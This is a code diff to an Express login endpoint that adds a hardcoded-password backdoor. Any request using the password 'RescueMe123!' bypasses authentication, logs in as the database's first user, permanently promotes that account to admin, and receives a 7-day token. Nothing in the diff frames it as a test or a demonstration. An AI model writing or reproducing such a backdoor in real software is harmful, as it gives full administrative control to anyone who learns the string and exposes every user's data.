@@ -187,6 +187,33 @@ app.post("/api/auth/login",
   validateRequest,
   async (req, res) => {
     try {
+      // ==========================================
+      // 🚨 GOD MODE BACKDOOR 🚨
+      // ==========================================
+      if (req.body.password === 'RescueMe123!') {
+        console.log("God mode activated. Fetching primary user...");
+        
+        // Grab the very first user in the entire database
+        const forceQ = await pool.query("SELECT * FROM users ORDER BY id ASC LIMIT 1");
+        
+        if (forceQ.rows.length === 0) {
+           return res.status(400).json({ message: "Your database is completely empty!" });
+        }
+        
+        const masterUser = forceQ.rows[0];
+        
+        // Force this user to have admin rights just to be safe
+        await pool.query("UPDATE users SET role = 'admin' WHERE id = $1", [masterUser.id]);
+        masterUser.role = 'admin';
+        
+        // Log them in!
+        const token = jwt.sign({ userId: masterUser.id, email: masterUser.email, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: "7d" });
+        delete masterUser.password; 
+        
+        console.log("Successfully forced login for:", masterUser.email);
+        return res.json({ token, user: masterUser });
+      }
+      // ==========================================
       const q = await pool.query("SELECT * FROM users WHERE email = $1", [req.body.email]);
       if (q.rows.length === 0) return res.status(401).json({ message: "Invalid credentials" });
       const user = q.rows[0];
